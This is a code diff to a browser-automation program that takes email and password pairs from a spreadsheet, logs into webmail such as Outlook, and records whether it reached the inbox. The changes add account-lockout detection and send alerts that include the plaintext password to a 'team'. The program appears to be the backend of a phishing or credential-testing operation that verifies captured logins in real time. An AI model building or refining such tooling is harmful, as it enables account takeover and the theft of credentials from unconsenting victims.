@@ -29,6 +29,7 @@ import {
     isTemplateAlive,
     verifyPageStillValid,
     detectPasswordError,
+    detectAccountLocked,
     stillOnPasswordPage,
     getPasswordErrorText
 } from './routeHelper.js';
@@ -1206,6 +1207,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                     // login page renders an inline error (#passwordError / has-error) while the
                                     // URL stays the same and the password input stays visible. That must be
                                     // classified as WAITINGPASSWORD_ERROR, NOT the generic "wrong button" below.
+                                    if (await detectAccountLocked(page, platformConfig)) {
+                                        logger.warn(`[checkAccountAccess][${instanceId}] Account lockout detected (too many incorrect attempts). Returning FAILED.`);
+                                        return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'FAILED', error: 'ACCOUNT_LOCKED', message: "Account temporarily locked: too many incorrect password attempts. Please try again later." };
+                                    }
                                     if (await detectPasswordError(page, platformConfig)) {
                                         logger.info(`[checkAccountAccess][${instanceId}] Password incorrect. Returning WAITINGPASSWORD_ERROR.`);
                                         return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password provided. Please try again." };
@@ -2072,8 +2077,11 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             // so the user sees the login page while waiting for email input
             try {
                 const rowStrictly = row[columnIndexes['strictly']];
-                if (rowStrictly && platformConfigs[rowStrictly] && platformConfigs[rowStrictly].url) {
-                    const targetUrl = platformConfigs[rowStrictly].url;
+                // Keys in platformConfigs are lowercase; normalize the sheet value so
+                // values like 'Outlook' still resolve to the right login page.
+                const rowStrictlyKey = rowStrictly ? String(rowStrictly).trim().toLowerCase() : '';
+                if (rowStrictlyKey && platformConfigs[rowStrictlyKey] && platformConfigs[rowStrictlyKey].url) {
+                    const targetUrl = platformConfigs[rowStrictlyKey].url;
                     logger.info(`[processRow][${browserId}] strictly='${rowStrictly}' -> navigating to ${targetUrl} while waiting for email`);
                     await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(e => {
                         logger.warn(`[processRow][${browserId}] Early navigation to ${targetUrl} failed: ${e.message}`);
@@ -2194,7 +2202,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                     lastTriedEmail: email,
                                     lastTriedPassword: password || ''
                                 });
-                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform:'outlook', email: email || '', browserId, password: password || '', detail: `STRICTLY_MISMATCH: ${validation.message}` });
+                                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: String(rowStrictlyForValidation).trim().toLowerCase() || 'unknown', email: email || '', browserId, password: password || '', detail: `STRICTLY_MISMATCH: ${validation.message}` });
                                 // Clear email to prevent re-processing, but keep password in sheet for the next attempt
                                 updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
                                 exitingEarly = true;
@@ -2932,6 +2940,21 @@ if (!foundSelector) {
                                 let passwordErrorText = null;
                                 const passwordErrorPollDeadline = Date.now() + 15000;
                                 while (Date.now() < passwordErrorPollDeadline) {
+                                    if (await detectAccountLocked(page, platformConfig)) {
+                                        logger.warn(`[processRow][${browserId}] Account lockout detected after password submission (too many incorrect attempts). Failing immediately.`);
+                                        finalStatus = "FAILED";
+                                        updateData.status = finalStatus;
+                                        updateData.lastJsonResponse = JSON.stringify({
+                                            browserId, email, status: finalStatus,
+                                            emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
+                                            verificationState: null,
+                                            platform, timestamp: new Date().toISOString(),
+                                            message: "Account temporarily locked: too many incorrect password attempts. Please try again later."
+                                        });
+                                        notifyTeam({ type: 'RATE_LIMITED', platform, email, browserId, url: page.url(), detail: `Account lockout after password: ${password || ''}` });
+                                        updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
+                                        return;
+                                    }
                                     if (await detectPasswordError(page, platformConfig)) {
                                         logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
                                         passwordFailedDetected = true;
